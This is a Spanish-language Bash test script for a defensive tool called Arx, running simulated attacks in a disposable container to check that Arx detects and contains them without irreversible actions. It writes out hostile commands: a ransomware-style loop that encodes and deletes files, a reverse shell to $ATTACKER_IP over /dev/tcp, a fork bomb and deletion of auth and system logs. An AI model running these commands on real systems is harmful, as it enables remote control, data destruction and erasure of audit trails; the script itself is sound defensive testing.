#!/usr/bin/env bash
# Nivel 10 — destrucción, con Arx como servicio en --enforce: ransomware simulado sobre señuelos, una
# tormenta de acciones contra el freno, fork bomb acotada y borrado de logs.
#   bash lab/level10.sh
# Solo en este contenedor efímero, con límites de procesos y memoria. Lo que se mide no es sobrevivir
# a lo imposible, sino que Arx siga en pie, avise, no haga nada irreversible y no se deje agotar.
# No sustituye a la VM: el kernel es el de Docker, y no hay disco ni arranque que destruir.
set -uo pipefail
cd "$(dirname "$0")/.."
source lab/systemd/lib.sh
lab_up

incident() { docker exec "$VIC" grep -q "$1" /var/lib/arx/incidents.jsonl; }
v bash -c 'install -d /root/lab-data; for i in 1 2 3 4 5; do echo "fichero $i" > /root/lab-data/doc$i.txt; done'

step "ransomware simulado: cifra el árbol de datos y, como uno real, también los señuelos"
CANARIES=$(v python3 -c "import sys; sys.path.insert(0,'/usr/lib/arx/arx.pyz'); from arx.modules import canaries; print(' '.join(c['path'] for c in canaries._load().get('canaries', [])))")
echo "  señuelos plantados: $(echo "$CANARIES" | wc -w)"
docker exec -i "$VIC" bash -s -- $CANARIES <<'SH'
for f in /root/lab-data/* "$@"; do
  [ -f "$f" ] && python3 -c "import sys,base64; d=open(sys.argv[1],'rb').read(); open(sys.argv[1]+'.enc','wb').write(base64.b64encode(d))" "$f" && rm "$f"
done
SH
if wait_for 70 incident "canary GONE"; then pass "los señuelos cifrados dan la alarma"; else fail "los señuelos cifrados dan la alarma"; fi

step "tormenta: más acciones de las que permite el freno, y después un reverse shell"
v bash -c 'for p in 7001 7002 7003 7004 7005 7006 7007 7008; do systemd-run --quiet --unit=ruido-$p nc -k -l $p; done'
tripped() { docker exec "$VIC" arx status | grep -q "SAFETY BRAKE"; }
if wait_for 70 tripped; then pass "el freno salta y Arx deja de actuar"; else fail "el freno salta y Arx deja de actuar"; fi
BLOCKED=$(v nft list set inet arx block_tcp | grep -oE '700[0-9]' | sort -u | wc -l)
if [ "$BLOCKED" -le 5 ]; then pass "se detuvo en el límite ($BLOCKED puertos de 8)"; else fail "se detuvo en el límite ($BLOCKED puertos de 8)"; fi
docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
c2_cut() { docker exec "$VIC" nft list set inet arx c2_out4 2>/dev/null | grep -q "$ATTACKER_IP"; }
if wait_for 70 c2_cut; then pass "agotado el freno, el reverse shell sí se corta (cupo para críticos)"; else fail "agotado el freno, el reverse shell sí se corta"; fi

step "fork bomb acotada por systemd (25 s, máximo 1024 tareas)"
v systemd-run --quiet --unit=bomba -p TasksMax=1024 -p RuntimeMaxSec=25 bash -c ':(){ :|:& };:'
sleep 30
v systemctl stop bomba 2>/dev/null
check "Arx sigue en pie tras la fork bomb" v systemctl is-active -q arx

step "borrado de logs"
v rm -f /var/log/auth.log /var/log/syslog
if wait_for 70 incident "desapareció"; then pass "borrar el log de autenticación da la alarma"; else fail "borrar el log de autenticación da la alarma"; fi

step "matar a Arx: vuelve, y sigue defendiendo"
PID=$(v systemctl show -p MainPID --value arx)
v kill -9 "$PID"
check "vuelve tras kill -9" wait_for 25 bash -c "p=\$(docker exec $VIC systemctl show -p MainPID --value arx); [ \"\$p\" != 0 ] && [ \"\$p\" != $PID ]"

step "lo que Arx NO debe haber hecho: nada irreversible por su cuenta"
STATUS=$(v arx status --json)
echo "$STATUS" | python3 -c "
import json,sys
d=json.load(sys.stdin)
print('  bloqueos', d['blocks'], '· pendientes', len(d['pending']), '· cuentas', d['locked_accounts'], '· cuarentena', d['quarantine'], '· freno', d['breaker_tripped'])
sys.exit(0 if not d['locked_accounts'] and d['quarantine'] == 0 else 1)" \
  && pass "ninguna cuenta bloqueada ni fichero movido sin tu palabra" || fail "ninguna cuenta bloqueada ni fichero movido sin tu palabra"
if reaches 22; then pass "el SSH sigue llegando: no te ha dejado fuera"; else fail "el SSH sigue llegando: no te ha dejado fuera"; fi
v bash -c 'test -f /root/lab-data/doc1.txt.enc' && pass "la evidencia del ataque sigue en su sitio" || fail "la evidencia del ataque sigue en su sitio"

step "y queda el informe"
v arx forensics | tail -6 | sed 's/^/  /'
REP=$(v bash -c 'ls -t /var/lib/arx/forensics/forensic-*.json 2>/dev/null | head -1')
if [ -n "$REP" ] && v arx forensics --verify "$REP" >/dev/null; then pass "informe sellado y verificable"; else fail "informe sellado y verificable"; fi
v arx metrics --days 1 | sed -n 2,8p | sed 's/^/  /'

echo
if [ "$FAILED" = 0 ]; then echo "══ NIVEL 10 SUPERADO ══"; else echo "══ NIVEL 10 CON FALLOS (ver líneas [FAIL]) ══"; exit 1; fi
